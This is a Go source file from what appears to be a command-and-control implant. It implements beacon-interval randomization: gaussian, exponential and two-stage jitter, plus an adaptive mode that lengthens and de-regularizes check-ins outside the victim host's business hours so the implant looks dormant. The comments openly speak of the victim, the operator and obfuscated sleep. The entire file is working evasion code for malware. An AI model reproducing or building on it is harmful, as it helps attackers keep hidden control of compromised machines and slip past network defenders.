//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"math"
	"time"
)

// BeaconRandomizationMode controls how beacon intervals are randomized.
type BeaconRandomizationMode string

const (
	// RandomizationLinear uses uniform random within ±jitter% of interval.
	RandomizationLinear BeaconRandomizationMode = "linear"
	// RandomizationGaussian uses normal distribution centered at interval,
	// stddev = interval * jitter%.
	RandomizationGaussian BeaconRandomizationMode = "gaussian"
	// RandomizationExponential uses exponential decay (more frequent shorter intervals).
	RandomizationExponential BeaconRandomizationMode = "exponential"
	// RandomizationTwoStage first picks a random base interval [interval*0.7..interval*1.3],
	// then applies jitter within that base.
	RandomizationTwoStage BeaconRandomizationMode = "two_stage"
	// RandomizationAdaptive dynamically adjusts based on network conditions and time of day.
	RandomizationAdaptive BeaconRandomizationMode = "adaptive"
)

// Global configuration for beacon randomization mode.
var beaconRandomizationMode BeaconRandomizationMode

// initBeaconRandomization initializes the randomization mode from the compile-time config.
func initBeaconRandomization() {
	switch BeaconRandomizationStr {
	case "gaussian":
		beaconRandomizationMode = RandomizationGaussian
	case "exponential":
		beaconRandomizationMode = RandomizationExponential
	case "two_stage":
		beaconRandomizationMode = RandomizationTwoStage
	case "adaptive":
		beaconRandomizationMode = RandomizationAdaptive
	default:
		beaconRandomizationMode = RandomizationLinear
	}
}

// gaussianRandom generates a normally-distributed random number in [-3, 3].
// It uses the Box-Muller transform with a seeded RNG for reproducibility.
func gaussianRandom() float64 {
	// Box-Muller transform with two uniform randoms
	u1 := rng.Float64()
	u2 := rng.Float64()
	// Avoid log(0)
	if u1 < 1e-10 {
		u1 = 1e-10
	}
	// sqrt(-2*ln(u1) * cos(2*pi*u2))
	z := math.Sqrt(-2.0*math.Log(u1)) * math.Cos(2.0*math.Pi*u2)
	// Clamp to [-3, 3] to avoid extreme outliers
	if z < -3.0 {
		z = -3.0
	}
	if z > 3.0 {
		z = 3.0
	}
	return z
}

// exponentialRandom generates an exponentially-distributed random number
// biased towards shorter intervals (mean = 1).
func exponentialRandom() float64 {
	u := rng.Float64()
	// Inverse CDF of exponential distribution
	// Clamp to avoid extreme values
	val := -math.Log(1.0 - u)
	if val > 3.0 {
		val = 3.0
	}
	return val
}

// computeBeaconIntervalWithMode calculates the next beacon interval based on the configured mode.
func computeBeaconIntervalWithMode(base time.Duration, jitterPercent float64) time.Duration {
	jitter := jitterPercent / 100.0

	switch beaconRandomizationMode {
	case RandomizationGaussian:
		// Normal distribution centered at base, stddev = base * jitter
		stddev := float64(base) * jitter
		variation := time.Duration(gaussianRandom() * stddev)
		return base + variation

	case RandomizationExponential:
		// Exponential decay biased towards shorter intervals
		// Scale so mean equals base
		variation := time.Duration(float64(base) * (exponentialRandom() - 1.0) * jitter)
		return base + variation

	case RandomizationTwoStage:
		// First stage: random base interval [interval*0.7..interval*1.3]
		baseMultiplier := 0.7 + rng.Float64()*0.6
		randomBase := time.Duration(float64(base) * baseMultiplier)
		// Second stage: apply jitter within that base
		variation := time.Duration(float64(randomBase) * jitter * (rng.Float64()*2 - 1))
		return randomBase + variation

	case RandomizationAdaptive:
		// Adaptive genuinely modulates on the environment instead of aliasing to
		// gaussian: outside the operator's active window (a configured working-hours
		// window, else local business hours) the beacon lengthens and de-regularizes
		// so the implant reads as dormant between checks; inside the window it
		// tightens back toward the configured base. Both cases keep gaussian jitter
		// but scale the interval and the spread, so the cadence is never as regular
		// as plain linear jitter. Bounded to stay sane.
		scale, spreadMul := adaptiveFactor(time.Now())
		stddev := float64(base) * jitter * spreadMul
		variation := time.Duration(gaussianRandom() * stddev)
		interval := time.Duration(float64(base)*scale) + variation
		return interval

	default:
		// Linear (default): uniform random within ±jitter% of base
		variation := time.Duration(float64(base) * jitter * (rng.Float64()*2 - 1))
		return base + variation
	}
}

// adaptiveFactor returns (intervalScale, spreadMultiplier) for the adaptive
// beacon mode given the current instant. It is a pure function of `now` and the
// configured working-hours window so it is directly testable (it does NOT read
// the wall clock again, which would make it non-deterministic under test).
//
// Active signal (highest priority): a configured working-hours window
// (working_start AND working_end set). In-window -> (1.0, 1.0): tighten toward
// the base and use nominal spread. Out-of-window -> (1.5, 1.6): sleep ~50%
// longer and widen the jitter so the cadence looks dormant and irregular.
//
// No window configured: fall back to a local time-of-day heuristic -- local
// business hours (09:00-17:59) -> active (1.0, 1.0); otherwise out-of-hours ->
// (1.35, 1.4), a gentler dormant shift than an explicit out-of-window because
// the heuristic is weaker evidence than an operator-set window.
//
// Bounds: scale in [1.0, 1.5], spread in [1.0, 1.6]. floorBeaconInterval and
// applyMaxRandomCap in the caller still clamp the final duration, so a large
// base with a high spread can never produce a runaway sleep here.
func adaptiveFactor(now time.Time) (float64, float64) {
	wh := getWorkingHours()
	if wh.start != "" && wh.end != "" {
		if withinWindowAt(now, wh) {
			return 1.0, 1.0
		}
		return 1.5, 1.6
	}
	// No window configured: track the VICTIM HOST's real day/night so the
	// implant idles when its operator sleeps. Use an operator-set timezone if
	// one was configured, otherwise the host's own local clock -- NOT a forced
	// UTC. Forcing UTC shifted the dormant window by the host's UTC offset
	// (e.g. a UTC+8 victim looked "active" at its 3am), inverting the heuristic.
	var h int
	if tz := wh.tz; tz != "" {
		if loc, err := time.LoadLocation(tz); err == nil {
			h = now.In(loc).Hour()
		} else {
			h = now.Local().Hour()
		}
	} else {
		h = now.Local().Hour()
	}
	if h >= 9 && h < 18 {
		return 1.0, 1.0
	}
	return 1.35, 1.4
}

// applyMaxRandomCap clamps the computed interval if MaxRandomIntervalMs is set.
// The caller passes the SAME base the distribution was centered on (FastInterval
// in interactive fast mode, otherwise Interval) so the cap's reference never
// drifts from the actual beacon cadence: measuring the allowance against the
// global Interval while the beacon is fast-mode would let the cap permit a delay
// far larger than the short live interval it should bound.
func applyMaxRandomCap(base, interval time.Duration) time.Duration {
	if MaxRandomIntervalMs <= 0 {
		return interval
	}
	maxCap := time.Duration(MaxRandomIntervalMs) * time.Millisecond
	// The cap applies to the random variation above the base interval.
	// So max allowed interval = base interval + MaxRandomIntervalMs.
	maxAllowed := base + maxCap
	if interval > maxAllowed {
		return maxAllowed
	}
	return interval
}

// floorBeaconInterval bounds the randomized interval from below so the
// symmetric distributions (gaussian ±3σ, two-stage, exponential) can never
// yield a zero or negative sleep. A near-zero return from sleepWithMask /
// sleepObfuscated / waitForBeaconWake means an immediate next beacon — a
// self-inflicted beacon storm that also reads to the server as a dead-or-flap
// implant. The floor is 1s (the server clamps Interval to >=1s) and at least
// 10% of the base so a long beacon cadence keeps meaningful variance without
// ever collapsing to a tight loop.
func floorBeaconInterval(base, interval time.Duration) time.Duration {
	floor := time.Second
	if t := base / 10; t > floor {
		floor = t
	}
	if interval < floor {
		return floor
	}
	return interval
}
